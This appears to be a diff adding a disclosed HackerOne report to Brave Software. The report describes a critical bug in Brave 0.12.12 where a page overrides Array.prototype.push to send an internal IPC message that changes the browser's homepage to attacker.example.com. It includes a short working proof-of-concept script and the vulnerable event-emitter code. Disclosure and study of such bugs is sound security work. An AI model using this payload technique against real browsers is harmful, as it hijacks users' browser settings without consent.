@@ -1,0 +1,50 @@
+ReportLink:https://hackerone.com/reports/188561
+WeaknessName:Command Injection - Generic
+Reporter:https://hackerone.com/masatokinugawa
+ReportedTo:Brave Software(brave)
+BountyAmount:
+Severity:critical
+State:Closed
+DateOfDisclosure:18.09.2018 18:15:36
+
+Summary:
+
+## Summary:
+This bug is similar to #187542 and #188086.
+I found that also `Array.prototype.push` is exploitable.
+
+## Tested on: 
+Brave	0.12.12
+
+## Steps To Reproduce:
+1. Go to this page: https://vulnerabledoma.in/brave/settings_change3.html 
+```
+<script>
+Array.prototype.push=function(e){
+	this[0]=function(e,f){
+		e.sender.send("dispatch-action",'{"actionType":"app-change-setting","key":"general.homepage","value":"http://attacker.example.com/"}');
+	}
+}
+</script>
+
+<embed src=".swf"></embed>
+```
+
+2. See `about:preferences`. You can confirm that your home page is changed to `http://attacker.example.com/`.
+
+Also an attacker can do UXSS and address bar spoofing using this bug. Please see #187542's PoC .
+
+#Technical Details
+
+This `push` in the `event_emitter.js` is overwritten: 
+```
+EventEmitter2.prototype.on = function (event, fn) {
+  this._callbacks = this._callbacks || {};
+  (this._callbacks['$' + event] = this._callbacks['$' + event] || [])
+    .push(fn);
+  return this;
+};
+```
+
+Could you confirm this bug?
+Thanks!
